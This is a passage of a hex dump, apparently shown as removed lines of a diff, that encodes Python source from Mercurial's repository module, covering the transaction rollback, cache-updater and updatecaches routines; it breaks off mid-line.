-00018770: 7365 6c66 2e73 7666 732c 0a20 2020 2020  self.svfs,.     
-00018780: 2020 2020 2020 2020 2020 2020 2020 2076                 v
-00018790: 6673 6d61 702c 0a20 2020 2020 2020 2020  fsmap,.         
-000187a0: 2020 2020 2020 2020 2020 2062 226a 6f75             b"jou
-000187b0: 726e 616c 222c 0a20 2020 2020 2020 2020  rnal",.         
-000187c0: 2020 2020 2020 2020 2020 2073 656c 662e             self.
-000187d0: 7569 2e77 6172 6e2c 0a20 2020 2020 2020  ui.warn,.       
-000187e0: 2020 2020 2020 2020 2020 2020 2063 6865               che
-000187f0: 636b 616d 6269 6766 696c 6573 3d5f 6361  ckambigfiles=_ca
-00018800: 6368 6564 6669 6c65 732c 0a20 2020 2020  chedfiles,.     
-00018810: 2020 2020 2020 2020 2020 2029 0a20 2020             ).   
-00018820: 2020 2020 2020 2020 2020 2020 2073 656c               sel
-00018830: 662e 696e 7661 6c69 6461 7465 2829 0a20  f.invalidate(). 
-00018840: 2020 2020 2020 2020 2020 2020 2020 2072                 r
-00018850: 6574 7572 6e20 5472 7565 0a20 2020 2020  eturn True.     
-00018860: 2020 2020 2020 2065 6c73 653a 0a20 2020         else:.   
-00018870: 2020 2020 2020 2020 2020 2020 2073 656c               sel
-00018880: 662e 7569 2e77 6172 6e28 5f28 6222 6e6f  f.ui.warn(_(b"no
-00018890: 2069 6e74 6572 7275 7074 6564 2074 7261   interrupted tra
-000188a0: 6e73 6163 7469 6f6e 2061 7661 696c 6162  nsaction availab
-000188b0: 6c65 5c6e 2229 290a 2020 2020 2020 2020  le\n")).        
-000188c0: 2020 2020 2020 2020 7265 7475 726e 2046          return F
-000188d0: 616c 7365 0a0a 2020 2020 6465 6620 726f  alse..    def ro
-000188e0: 6c6c 6261 636b 2873 656c 662c 2064 7279  llback(self, dry
-000188f0: 7275 6e3d 4661 6c73 652c 2066 6f72 6365  run=False, force
-00018900: 3d46 616c 7365 293a 0a20 2020 2020 2020  =False):.       
-00018910: 2077 6c6f 636b 203d 206c 6f63 6b20 3d20   wlock = lock = 
-00018920: 4e6f 6e65 0a20 2020 2020 2020 2074 7279  None.        try
-00018930: 3a0a 2020 2020 2020 2020 2020 2020 776c  :.            wl
-00018940: 6f63 6b20 3d20 7365 6c66 2e77 6c6f 636b  ock = self.wlock
-00018950: 2829 0a20 2020 2020 2020 2020 2020 206c  ().            l
-00018960: 6f63 6b20 3d20 7365 6c66 2e6c 6f63 6b28  ock = self.lock(
-00018970: 290a 2020 2020 2020 2020 2020 2020 6966  ).            if
-00018980: 2073 656c 662e 7376 6673 2e65 7869 7374   self.svfs.exist
-00018990: 7328 6222 756e 646f 2229 3a0a 2020 2020  s(b"undo"):.    
-000189a0: 2020 2020 2020 2020 2020 2020 7265 7475              retu
-000189b0: 726e 2073 656c 662e 5f72 6f6c 6c62 6163  rn self._rollbac
-000189c0: 6b28 6472 7972 756e 2c20 666f 7263 6529  k(dryrun, force)
-000189d0: 0a20 2020 2020 2020 2020 2020 2065 6c73  .            els
-000189e0: 653a 0a20 2020 2020 2020 2020 2020 2020  e:.             
-000189f0: 2020 2073 656c 662e 7569 2e77 6172 6e28     self.ui.warn(
-00018a00: 5f28 6222 6e6f 2072 6f6c 6c62 6163 6b20  _(b"no rollback 
-00018a10: 696e 666f 726d 6174 696f 6e20 6176 6169  information avai
-00018a20: 6c61 626c 655c 6e22 2929 0a20 2020 2020  lable\n")).     
-00018a30: 2020 2020 2020 2020 2020 2072 6574 7572             retur
-00018a40: 6e20 310a 2020 2020 2020 2020 6669 6e61  n 1.        fina
-00018a50: 6c6c 793a 0a20 2020 2020 2020 2020 2020  lly:.           
-00018a60: 2072 656c 6561 7365 286c 6f63 6b2c 2077   release(lock, w
-00018a70: 6c6f 636b 290a 0a20 2020 2040 756e 6669  lock)..    @unfi
-00018a80: 6c74 6572 6564 6d65 7468 6f64 2020 2320  lteredmethod  # 
-00018a90: 556e 7469 6c20 7765 2067 6574 2073 6d61  Until we get sma
-00018aa0: 7274 6572 2063 6163 6865 206d 616e 6167  rter cache manag
-00018ab0: 656d 656e 740a 2020 2020 6465 6620 5f72  ement.    def _r
-00018ac0: 6f6c 6c62 6163 6b28 7365 6c66 2c20 6472  ollback(self, dr
-00018ad0: 7972 756e 2c20 666f 7263 6529 3a0a 2020  yrun, force):.  
-00018ae0: 2020 2020 2020 7569 203d 2073 656c 662e        ui = self.
-00018af0: 7569 0a0a 2020 2020 2020 2020 7061 7265  ui..        pare
-00018b00: 6e74 7320 3d20 7365 6c66 2e64 6972 7374  nts = self.dirst
-00018b10: 6174 652e 7061 7265 6e74 7328 290a 2020  ate.parents().  
-00018b20: 2020 2020 2020 7472 793a 0a20 2020 2020        try:.     
-00018b30: 2020 2020 2020 2061 7267 7320 3d20 7365         args = se
-00018b40: 6c66 2e76 6673 2e72 6561 6428 6227 756e  lf.vfs.read(b'un
-00018b50: 646f 2e64 6573 6327 292e 7370 6c69 746c  do.desc').splitl
-00018b60: 696e 6573 2829 0a20 2020 2020 2020 2020  ines().         
-00018b70: 2020 2028 6f6c 646c 656e 2c20 6465 7363     (oldlen, desc
-00018b80: 2c20 6465 7461 696c 2920 3d20 2869 6e74  , detail) = (int
-00018b90: 2861 7267 735b 305d 292c 2061 7267 735b  (args[0]), args[
-00018ba0: 315d 2c20 4e6f 6e65 290a 2020 2020 2020  1], None).      
-00018bb0: 2020 2020 2020 6966 206c 656e 2861 7267        if len(arg
-00018bc0: 7329 203e 3d20 333a 0a20 2020 2020 2020  s) >= 3:.       
-00018bd0: 2020 2020 2020 2020 2064 6574 6169 6c20           detail 
-00018be0: 3d20 6172 6773 5b32 5d0a 2020 2020 2020  = args[2].      
-00018bf0: 2020 2020 2020 6f6c 6474 6970 203d 206f        oldtip = o
-00018c00: 6c64 6c65 6e20 2d20 310a 0a20 2020 2020  ldlen - 1..     
-00018c10: 2020 2020 2020 2069 6620 6465 7461 696c         if detail
-00018c20: 2061 6e64 2075 692e 7665 7262 6f73 653a   and ui.verbose:
-00018c30: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00018c40: 206d 7367 203d 205f 280a 2020 2020 2020   msg = _(.      
-00018c50: 2020 2020 2020 2020 2020 2020 2020 6227                b'
-00018c60: 7265 706f 7369 746f 7279 2074 6970 2072  repository tip r
-00018c70: 6f6c 6c65 6420 6261 636b 2074 6f20 7265  olled back to re
-00018c80: 7669 7369 6f6e 2025 6427 0a20 2020 2020  vision %d'.     
-00018c90: 2020 2020 2020 2020 2020 2020 2020 2062                 b
-00018ca0: 2720 2875 6e64 6f20 2573 3a20 2573 295c  ' (undo %s: %s)\
-00018cb0: 6e27 0a20 2020 2020 2020 2020 2020 2020  n'.             
-00018cc0: 2020 2029 2025 2028 6f6c 6474 6970 2c20     ) % (oldtip, 
-00018cd0: 6465 7363 2c20 6465 7461 696c 290a 2020  desc, detail).  
-00018ce0: 2020 2020 2020 2020 2020 656c 7365 3a0a            else:.
-00018cf0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00018d00: 6d73 6720 3d20 5f28 0a20 2020 2020 2020  msg = _(.       
-00018d10: 2020 2020 2020 2020 2020 2020 2062 2772               b'r
-00018d20: 6570 6f73 6974 6f72 7920 7469 7020 726f  epository tip ro
-00018d30: 6c6c 6564 2062 6163 6b20 746f 2072 6576  lled back to rev
-00018d40: 6973 696f 6e20 2564 2028 756e 646f 2025  ision %d (undo %
-00018d50: 7329 5c6e 270a 2020 2020 2020 2020 2020  s)\n'.          
-00018d60: 2020 2020 2020 2920 2520 286f 6c64 7469        ) % (oldti
-00018d70: 702c 2064 6573 6329 0a20 2020 2020 2020  p, desc).       
-00018d80: 2020 2020 2070 6172 656e 7467 6f6e 6520       parentgone 
-00018d90: 3d20 616e 7928 7365 6c66 5b70 5d2e 7265  = any(self[p].re
-00018da0: 7628 2920 3e20 6f6c 6474 6970 2066 6f72  v() > oldtip for
-00018db0: 2070 2069 6e20 7061 7265 6e74 7329 0a20   p in parents). 
-00018dc0: 2020 2020 2020 2065 7863 6570 7420 494f         except IO
-00018dd0: 4572 726f 723a 0a20 2020 2020 2020 2020  Error:.         
-00018de0: 2020 206d 7367 203d 205f 2862 2772 6f6c     msg = _(b'rol
-00018df0: 6c69 6e67 2062 6163 6b20 756e 6b6e 6f77  ling back unknow
-00018e00: 6e20 7472 616e 7361 6374 696f 6e5c 6e27  n transaction\n'
-00018e10: 290a 2020 2020 2020 2020 2020 2020 6465  ).            de
-00018e20: 7363 203d 204e 6f6e 650a 2020 2020 2020  sc = None.      
-00018e30: 2020 2020 2020 7061 7265 6e74 676f 6e65        parentgone
-00018e40: 203d 2054 7275 650a 0a20 2020 2020 2020   = True..       
-00018e50: 2069 6620 6e6f 7420 666f 7263 6520 616e   if not force an
-00018e60: 6420 7365 6c66 5b62 272e 275d 2021 3d20  d self[b'.'] != 
-00018e70: 7365 6c66 5b62 2774 6970 275d 2061 6e64  self[b'tip'] and
-00018e80: 2064 6573 6320 3d3d 2062 2763 6f6d 6d69   desc == b'commi
-00018e90: 7427 3a0a 2020 2020 2020 2020 2020 2020  t':.            
-00018ea0: 7261 6973 6520 6572 726f 722e 4162 6f72  raise error.Abor
-00018eb0: 7428 0a20 2020 2020 2020 2020 2020 2020  t(.             
-00018ec0: 2020 205f 280a 2020 2020 2020 2020 2020     _(.          
-00018ed0: 2020 2020 2020 2020 2020 6227 726f 6c6c            b'roll
-00018ee0: 6261 636b 206f 6620 6c61 7374 2063 6f6d  back of last com
-00018ef0: 6d69 7420 7768 696c 6520 6e6f 7420 6368  mit while not ch
-00018f00: 6563 6b65 6420 6f75 7420 270a 2020 2020  ecked out '.    
-00018f10: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00018f20: 6227 6d61 7920 6c6f 7365 2064 6174 6127  b'may lose data'
-00018f30: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00018f40: 2029 2c0a 2020 2020 2020 2020 2020 2020   ),.            
-00018f50: 2020 2020 6869 6e74 3d5f 2862 2775 7365      hint=_(b'use
-00018f60: 202d 6620 746f 2066 6f72 6365 2729 2c0a   -f to force'),.
-00018f70: 2020 2020 2020 2020 2020 2020 290a 0a20              ).. 
-00018f80: 2020 2020 2020 2075 692e 7374 6174 7573         ui.status
-00018f90: 286d 7367 290a 2020 2020 2020 2020 6966  (msg).        if
-00018fa0: 2064 7279 7275 6e3a 0a20 2020 2020 2020   dryrun:.       
-00018fb0: 2020 2020 2072 6574 7572 6e20 300a 0a20       return 0.. 
-00018fc0: 2020 2020 2020 2073 656c 662e 6465 7374         self.dest
-00018fd0: 726f 7969 6e67 2829 0a20 2020 2020 2020  roying().       
-00018fe0: 2076 6673 6d61 7020 3d20 7365 6c66 2e76   vfsmap = self.v
-00018ff0: 6673 5f6d 6170 0a20 2020 2020 2020 2073  fs_map.        s
-00019000: 6b69 705f 6a6f 7572 6e61 6c5f 7061 7474  kip_journal_patt
-00019010: 6572 6e20 3d20 4e6f 6e65 0a20 2020 2020  ern = None.     
-00019020: 2020 2069 6620 6e6f 7420 7061 7265 6e74     if not parent
-00019030: 676f 6e65 3a0a 2020 2020 2020 2020 2020  gone:.          
-00019040: 2020 736b 6970 5f6a 6f75 726e 616c 5f70    skip_journal_p
-00019050: 6174 7465 726e 203d 2052 455f 534b 4950  attern = RE_SKIP
-00019060: 5f44 4952 5354 4154 455f 524f 4c4c 4241  _DIRSTATE_ROLLBA
-00019070: 434b 0a20 2020 2020 2020 2074 7261 6e73  CK.        trans
-00019080: 6163 7469 6f6e 2e72 6f6c 6c62 6163 6b28  action.rollback(
-00019090: 0a20 2020 2020 2020 2020 2020 2073 656c  .            sel
-000190a0: 662e 7376 6673 2c0a 2020 2020 2020 2020  f.svfs,.        
-000190b0: 2020 2020 7666 736d 6170 2c0a 2020 2020      vfsmap,.    
-000190c0: 2020 2020 2020 2020 6227 756e 646f 272c          b'undo',
-000190d0: 0a20 2020 2020 2020 2020 2020 2075 692e  .            ui.
-000190e0: 7761 726e 2c0a 2020 2020 2020 2020 2020  warn,.          
-000190f0: 2020 6368 6563 6b61 6d62 6967 6669 6c65    checkambigfile
-00019100: 733d 5f63 6163 6865 6466 696c 6573 2c0a  s=_cachedfiles,.
-00019110: 2020 2020 2020 2020 2020 2020 736b 6970              skip
-00019120: 5f6a 6f75 726e 616c 5f70 6174 7465 726e  _journal_pattern
-00019130: 3d73 6b69 705f 6a6f 7572 6e61 6c5f 7061  =skip_journal_pa
-00019140: 7474 6572 6e2c 0a20 2020 2020 2020 2029  ttern,.        )
-00019150: 0a20 2020 2020 2020 2073 656c 662e 696e  .        self.in
-00019160: 7661 6c69 6461 7465 2829 0a20 2020 2020  validate().     
-00019170: 2020 2073 656c 662e 6469 7273 7461 7465     self.dirstate
-00019180: 2e69 6e76 616c 6964 6174 6528 290a 0a20  .invalidate().. 
-00019190: 2020 2020 2020 2069 6620 7061 7265 6e74         if parent
-000191a0: 676f 6e65 3a0a 2020 2020 2020 2020 2020  gone:.          
-000191b0: 2020 2320 7265 706c 6163 6520 7468 6973    # replace this
-000191c0: 2077 6974 6820 736f 6d65 2065 7870 6c69   with some expli
-000191d0: 6369 7420 7061 7265 6e74 2075 7064 6174  cit parent updat
-000191e0: 6520 696e 2074 6865 2066 7574 7572 652e  e in the future.
-000191f0: 0a20 2020 2020 2020 2020 2020 2068 6173  .            has
-00019200: 5f6e 6f64 6520 3d20 7365 6c66 2e63 6861  _node = self.cha
-00019210: 6e67 656c 6f67 2e69 6e64 6578 2e68 6173  ngelog.index.has
-00019220: 5f6e 6f64 650a 2020 2020 2020 2020 2020  _node.          
-00019230: 2020 6966 206e 6f74 2061 6c6c 2868 6173    if not all(has
-00019240: 5f6e 6f64 6528 7029 2066 6f72 2070 2069  _node(p) for p i
-00019250: 6e20 7365 6c66 2e64 6972 7374 6174 652e  n self.dirstate.
-00019260: 5f70 6c29 3a0a 2020 2020 2020 2020 2020  _pl):.          
-00019270: 2020 2020 2020 2320 5468 6572 6520 7761        # There wa
-00019280: 7320 6e6f 2064 6972 7374 6174 6520 746f  s no dirstate to
-00019290: 2062 6163 6b75 7020 696e 6974 6961 6c6c   backup initiall
-000192a0: 792c 2077 6520 6e65 6564 2074 6f20 6472  y, we need to dr
-000192b0: 6f70 0a20 2020 2020 2020 2020 2020 2020  op.             
-000192c0: 2020 2023 2074 6865 2065 7869 7374 696e     # the existin
-000192d0: 6720 6f6e 652e 0a20 2020 2020 2020 2020  g one..         
-000192e0: 2020 2020 2020 2077 6974 6820 7365 6c66         with self
-000192f0: 2e64 6972 7374 6174 652e 6368 616e 6769  .dirstate.changi
-00019300: 6e67 5f70 6172 656e 7473 2873 656c 6629  ng_parents(self)
-00019310: 3a0a 2020 2020 2020 2020 2020 2020 2020  :.              
-00019320: 2020 2020 2020 7365 6c66 2e64 6972 7374        self.dirst
-00019330: 6174 652e 7365 7470 6172 656e 7473 2873  ate.setparents(s
-00019340: 656c 662e 6e75 6c6c 6964 290a 2020 2020  elf.nullid).    
-00019350: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00019360: 7365 6c66 2e64 6972 7374 6174 652e 636c  self.dirstate.cl
-00019370: 6561 7228 290a 0a20 2020 2020 2020 2020  ear()..         
-00019380: 2020 2070 6172 656e 7473 203d 2074 7570     parents = tup
-00019390: 6c65 285b 702e 7265 7628 2920 666f 7220  le([p.rev() for 
-000193a0: 7020 696e 2073 656c 665b 4e6f 6e65 5d2e  p in self[None].
-000193b0: 7061 7265 6e74 7328 295d 290a 2020 2020  parents()]).    
-000193c0: 2020 2020 2020 2020 6966 206c 656e 2870          if len(p
-000193d0: 6172 656e 7473 2920 3e20 313a 0a20 2020  arents) > 1:.   
-000193e0: 2020 2020 2020 2020 2020 2020 2075 692e               ui.
-000193f0: 7374 6174 7573 280a 2020 2020 2020 2020  status(.        
-00019400: 2020 2020 2020 2020 2020 2020 5f28 0a20              _(. 
-00019410: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00019420: 2020 2020 2020 2062 2777 6f72 6b69 6e67         b'working
-00019430: 2064 6972 6563 746f 7279 206e 6f77 2062   directory now b
-00019440: 6173 6564 206f 6e20 270a 2020 2020 2020  ased on '.      
-00019450: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00019460: 2020 6227 7265 7669 7369 6f6e 7320 2564    b'revisions %d
-00019470: 2061 6e64 2025 645c 6e27 0a20 2020 2020   and %d\n'.     
-00019480: 2020 2020 2020 2020 2020 2020 2020 2029                 )
-00019490: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-000194a0: 2020 2020 2025 2070 6172 656e 7473 0a20       % parents. 
-000194b0: 2020 2020 2020 2020 2020 2020 2020 2029                 )
-000194c0: 0a20 2020 2020 2020 2020 2020 2065 6c73  .            els
-000194d0: 653a 0a20 2020 2020 2020 2020 2020 2020  e:.             
-000194e0: 2020 2075 692e 7374 6174 7573 280a 2020     ui.status(.  
-000194f0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00019500: 2020 5f28 6227 776f 726b 696e 6720 6469    _(b'working di
-00019510: 7265 6374 6f72 7920 6e6f 7720 6261 7365  rectory now base
-00019520: 6420 6f6e 2072 6576 6973 696f 6e20 2564  d on revision %d
-00019530: 5c6e 2729 2025 2070 6172 656e 7473 0a20  \n') % parents. 
-00019540: 2020 2020 2020 2020 2020 2020 2020 2029                 )
-00019550: 0a20 2020 2020 2020 2020 2020 206d 6572  .            mer
-00019560: 6765 7374 6174 656d 6f64 2e6d 6572 6765  gestatemod.merge
-00019570: 7374 6174 652e 636c 6561 6e28 7365 6c66  state.clean(self
-00019580: 290a 0a20 2020 2020 2020 2023 2054 4f44  )..        # TOD
-00019590: 4f3a 2069 6620 7765 206b 6e6f 7720 7768  O: if we know wh
-000195a0: 6963 6820 6e65 7720 6865 6164 7320 6d61  ich new heads ma
-000195b0: 7920 7265 7375 6c74 2066 726f 6d20 7468  y result from th
-000195c0: 6973 2072 6f6c 6c62 6163 6b2c 2070 6173  is rollback, pas
-000195d0: 730a 2020 2020 2020 2020 2320 7468 656d  s.        # them
-000195e0: 2074 6f20 6465 7374 726f 7928 292c 2077   to destroy(), w
-000195f0: 6869 6368 2077 696c 6c20 7072 6576 656e  hich will preven
-00019600: 7420 7468 6520 6272 616e 6368 6865 6164  t the branchhead
-00019610: 2063 6163 6865 2066 726f 6d20 6265 696e   cache from bein
-00019620: 670a 2020 2020 2020 2020 2320 696e 7661  g.        # inva
-00019630: 6c69 6461 7465 642e 0a20 2020 2020 2020  lidated..       
-00019640: 2073 656c 662e 6465 7374 726f 7965 6428   self.destroyed(
-00019650: 290a 2020 2020 2020 2020 7265 7475 726e  ).        return
-00019660: 2030 0a0a 2020 2020 6465 6620 5f62 7569   0..    def _bui
-00019670: 6c64 6361 6368 6575 7064 6174 6572 2873  ldcacheupdater(s
-00019680: 656c 662c 206e 6577 7472 616e 7361 6374  elf, newtransact
-00019690: 696f 6e29 3a0a 2020 2020 2020 2020 2222  ion):.        ""
-000196a0: 2263 616c 6c65 6420 6475 7269 6e67 2074  "called during t
-000196b0: 7261 6e73 6163 7469 6f6e 2074 6f20 6275  ransaction to bu
-000196c0: 696c 6420 7468 6520 6361 6c6c 6261 636b  ild the callback
-000196d0: 2075 7064 6174 696e 6720 6361 6368 650a   updating cache.
-000196e0: 0a20 2020 2020 2020 204c 6976 6573 206f  .        Lives o
-000196f0: 6e20 7468 6520 7265 706f 7369 746f 7279  n the repository
-00019700: 2074 6f20 6865 6c70 2065 7874 656e 7369   to help extensi
-00019710: 6f6e 2077 686f 206d 6967 6874 2077 616e  on who might wan
-00019720: 7420 746f 2061 7567 6d65 6e74 0a20 2020  t to augment.   
-00019730: 2020 2020 2074 6869 7320 6c6f 6769 632e       this logic.
-00019740: 2046 6f72 2074 6869 7320 7075 7270 6f73   For this purpos
-00019750: 652c 2074 6865 2063 7265 6174 6564 2074  e, the created t
-00019760: 7261 6e73 6163 7469 6f6e 2069 7320 7061  ransaction is pa
-00019770: 7373 6564 2074 6f20 7468 650a 2020 2020  ssed to the.    
-00019780: 2020 2020 6d65 7468 6f64 2e0a 2020 2020      method..    
-00019790: 2020 2020 2222 220a 2020 2020 2020 2020      """.        
-000197a0: 2320 7765 206d 7573 7420 6176 6f69 6420  # we must avoid 
-000197b0: 6379 636c 6963 2072 6566 6572 656e 6365  cyclic reference
-000197c0: 2062 6574 7765 656e 2072 6570 6f20 616e   between repo an
-000197d0: 6420 7472 616e 7361 6374 696f 6e2e 0a20  d transaction.. 
-000197e0: 2020 2020 2020 2072 6570 6f72 6566 203d         reporef =
-000197f0: 2077 6561 6b72 6566 2e72 6566 2873 656c   weakref.ref(sel
-00019800: 6629 0a0a 2020 2020 2020 2020 6465 6620  f)..        def 
-00019810: 7570 6461 7465 7228 7472 293a 0a20 2020  updater(tr):.   
-00019820: 2020 2020 2020 2020 2072 6570 6f20 3d20           repo = 
-00019830: 7265 706f 7265 6628 290a 2020 2020 2020  reporef().      
-00019840: 2020 2020 2020 6173 7365 7274 2072 6570        assert rep
-00019850: 6f20 6973 206e 6f74 204e 6f6e 6520 2023  o is not None  #
-00019860: 2068 656c 7020 7079 7479 7065 0a20 2020   help pytype.   
-00019870: 2020 2020 2020 2020 2072 6570 6f2e 7570           repo.up
-00019880: 6461 7465 6361 6368 6573 2874 7229 0a0a  datecaches(tr)..
-00019890: 2020 2020 2020 2020 7265 7475 726e 2075          return u
-000198a0: 7064 6174 6572 0a0a 2020 2020 4075 6e66  pdater..    @unf
-000198b0: 696c 7465 7265 646d 6574 686f 640a 2020  ilteredmethod.  
-000198c0: 2020 6465 6620 7570 6461 7465 6361 6368    def updatecach
-000198d0: 6573 2873 656c 662c 2074 723d 4e6f 6e65  es(self, tr=None
-000198e0: 2c20 6675 6c6c 3d46 616c 7365 2c20 6361  , full=False, ca
-000198f0: 6368 6573 3d4e 6f6e 6529 3a0a 2020 2020  ches=None):.    
-00019900: 2020 2020 2222 2277 6172 6d20 6170 7072      """warm appr
-00019910: 6f70 7269 6174 6520 6361 6368 6573 0a0a  opriate caches..
-00019920: 2020 2020 2020 2020 4966 2074 6869 7320          If this 
-00019930: 6675 6e63 7469 6f6e 2069 7320 6361 6c6c  function is call
-00019940: 6564 2061 6674 6572 2061 2074 7261 6e73  ed after a trans
-00019950: 6163 7469 6f6e 2063 6c6f 7365 642e 2054  action closed. T
-00019960: 6865 2074 7261 6e73 6163 7469 6f6e 0a20  he transaction. 
-00019970: 2020 2020 2020 2077 696c 6c20 6265 2061         will be a
-00019980: 7661 696c 6162 6c65 2069 6e20 7468 6520  vailable in the 
-00019990: 2774 7227 2061 7267 756d 656e 742e 2054  'tr' argument. T
-000199a0: 6869 7320 6361 6e20 6265 2075 7365 6420  his can be used 
-000199b0: 746f 2073 656c 6563 7469 7665 6c79 0a20  to selectively. 
-000199c0: 2020 2020 2020 2075 7064 6174 6520 6361         update ca
-000199d0: 6368 6573 2072 656c 6576 616e 7420 746f  ches relevant to
-000199e0: 2074 6865 2063 6861 6e67 6573 2069 6e20   the changes in 
-000199f0: 7468 6174 2074 7261 6e73 6163 7469 6f6e  that transaction
-00019a00: 2e0a 0a20 2020 2020 2020 2049 6620 2766  ...        If 'f
-00019a10: 756c 6c27 2069 7320 7365 742c 206d 616b  ull' is set, mak
-00019a20: 6520 7375 7265 2061 6c6c 2063 6163 6865  e sure all cache
-00019a30: 7320 7468 6520 6675 6e63 7469 6f6e 206b  s the function k
-00019a40: 6e6f 7773 2061 626f 7574 2068 6176 650a  nows about have.
-00019a50: 2020 2020 2020 2020 7570 2d74 6f2d 6461          up-to-da
-00019a60: 7465 2064 6174 612e 2045 7665 6e20 7468  te data. Even th
-00019a70: 6520 6f6e 6573 2075 7375 616c 6c79 206c  e ones usually l
-00019a80: 6f61 6465 6420 6d6f 7265 206c 617a 696c  oaded more lazil
-00019a90: 792e 0a0a 2020 2020 2020 2020 5468 6520  y...        The 
-00019aa0: 6066 756c 6c60 2061 7267 756d 656e 7420  `full` argument 
-00019ab0: 6361 6e20 7461 6b65 2061 2073 7065 6369  can take a speci
-00019ac0: 616c 2022 706f 7374 2d63 6c6f 6e65 2220  al "post-clone" 
-00019ad0: 7661 6c75 652e 2049 6e20 7468 6973 2063  value. In this c
-00019ae0: 6173 650a 2020 2020 2020 2020 7468 6520  ase.        the 
-00019af0: 6361 6368 6520 7761 726d 696e 6720 6973  cache warming is
-00019b00: 206d 6164 6520 6166 7465 7220 6120 636c   made after a cl
-00019b10: 6f6e 6520 616e 6420 6f66 2074 6865 2073  one and of the s
-00019b20: 6c6f 7765 7220 6361 6368 6520 6d69 6768  lower cache migh
-00019b30: 740a 2020 2020 2020 2020 6265 2073 6b69  t.        be ski
-00019b40: 7070 6564 2c20 6e61 6d65 6c79 2074 6865  pped, namely the
-00019b50: 2060 2e66 6e6f 6465 7461 6773 6020 6f6e   `.fnodetags` on
-00019b60: 652e 2054 6869 7320 6172 6775 6d65 6e74  e. This argument
-00019b70: 2069 7320 352e 3820 7370 6563 6966 6963   is 5.8 specific
-00019b80: 0a20 2020 2020 2020 2061 7320 7765 2070  .        as we p
-00019b90: 6c61 6e20 666f 7220 6120 636c 6561 6e65  lan for a cleane
-00019ba0: 7220 7761 7920 746f 2064 6561 6c20 7769  r way to deal wi
-00019bb0: 7468 2074 6869 7320 666f 7220 352e 392e  th this for 5.9.
-00019bc0: 0a20 2020 2020 2020 2022 2222 0a20 2020  .        """.   
-00019bd0: 2020 2020 2069 6620 7472 2069 7320 6e6f       if tr is no
-00019be0: 7420 4e6f 6e65 2061 6e64 2074 722e 686f  t None and tr.ho
-00019bf0: 6f6b 6172 6773 2e67 6574 2862 2773 6f75  okargs.get(b'sou
-00019c00: 7263 6527 2920 3d3d 2062 2773 7472 6970  rce') == b'strip
-00019c10: 273a 0a20 2020 2020 2020 2020 2020 2023  ':.            #
-00019c20: 2044 7572 696e 6720 7374 7269 702c 206d   During strip, m
-00019c30: 616e 7920 6361 6368 6573 2061 7265 2069  any caches are i
-00019c40: 6e76 616c 6964 2062 7574 0a20 2020 2020  nvalid but.     
-00019c50: 2020 2020 2020 2023 206c 6174 6572 2063         # later c
-00019c60: 616c 6c20 746f 2060 6465 7374 726f 7965  all to `destroye
-00019c70: 6460 2077 696c 6c20 7265 6672 6573 6820  d` will refresh 
-00019c80: 7468 656d 2e0a 2020 2020 2020 2020 2020  them..          
-00019c90: 2020 7265 7475 726e 0a0a 2020 2020 2020    return..      
-00019ca0: 2020 756e 6669 203d 2073 656c 662e 756e    unfi = self.un
-00019cb0: 6669 6c74 6572 6564 2829 0a0a 2020 2020  filtered()..    
-00019cc0: 2020 2020 6966 2066 756c 6c3a 0a20 2020      if full:.   
-00019cd0: 2020 2020 2020 2020 206d 7367 203d 2028           msg = (
-00019ce0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00019cf0: 2022 6066 756c 6c60 2061 7267 756d 656e   "`full` argumen
-00019d00: 7420 666f 7220 6072 6570 6f2e 7570 6461  t for `repo.upda
-00019d10: 7465 6361 6368 6573 6020 6973 2064 6570  tecaches` is dep
-00019d20: 7265 6361 7465 645c 6e22 0a20 2020 2020  recated\n".     
-00019d30: 2020 2020 2020 2020 2020 2022 2875 7365             "(use
-00019d40: 2060 6361 6368 6573 3d72 6570 6f73 6974   `caches=reposit
-00019d50: 6f72 792e 4341 4348 455f 414c 4c60 2069  ory.CACHE_ALL` i
-00019d60: 6e73 7465 6164 2922 0a20 2020 2020 2020  nstead)".       
-00019d70: 2020 2020 2029 0a20 2020 2020 2020 2020       ).         
-00019d80: 2020 2073 656c 662e 7569 2e64 6570 7265     self.ui.depre
-00019d90: 6377 6172 6e28 6d73 672c 2062 2235 2e39  cwarn(msg, b"5.9
-00019da0: 2229 0a20 2020 2020 2020 2020 2020 2063  ").            c
-00019db0: 6163 6865 7320 3d20 7265 706f 7369 746f  aches = reposito
-00019dc0: 7279 2e43 4143 4845 535f 414c 4c0a 2020  ry.CACHES_ALL.  
-00019dd0: 2020 2020 2020 2020 2020 6966 2066 756c            if ful
-00019de0: 6c20 3d3d 2062 2270 6f73 742d 636c 6f6e  l == b"post-clon
-00019df0: 6522 3a0a 2020 2020 2020 2020 2020 2020  e":.            
-00019e00: 2020 2020 6361 6368 6573 203d 2072 6570      caches = rep
-00019e10: 6f73 6974 6f72 792e 4341 4348 4553 5f50  ository.CACHES_P
-00019e20: 4f53 545f 434c 4f4e 450a 2020 2020 2020  OST_CLONE.      
-00019e30: 2020 2020 2020 6361 6368 6573 203d 2072        caches = r
-00019e40: 6570 6f73 6974 6f72 792e 4341 4348 4553  epository.CACHES
-00019e50: 5f41 4c4c 0a20 2020 2020 2020 2065 6c69  _ALL.        eli
-00019e60: 6620 6361 6368 6573 2069 7320 4e6f 6e65  f caches is None
-00019e70: 3a0a 2020 2020 2020 2020 2020 2020 6361  :.            ca
-00019e80: 6368 6573 203d 2072 6570 6f73 6974 6f72  ches = repositor
-00019e90: 792e 4341 4348 4553 5f44 4546 4155 4c54  y.CACHES_DEFAULT
-00019ea0: 0a0a 2020 2020 2020 2020 6966 2072 6570  ..        if rep
-00019eb0: 6f73 6974 6f72 792e 4341 4348 455f 4252  ository.CACHE_BR
-00019ec0: 414e 4348 4d41 505f 5345 5256 4544 2069  ANCHMAP_SERVED i
-00019ed0: 6e20 6361 6368 6573 3a0a 2020 2020 2020  n caches:.      
-00019ee0: 2020 2020 2020 6966 2074 7220 6973 204e        if tr is N
-00019ef0: 6f6e 6520 6f72 2074 722e 6368 616e 6765  one or tr.change
-00019f00: 735b 6227 6f72 6967 7265 706f 6c65 6e27  s[b'origrepolen'
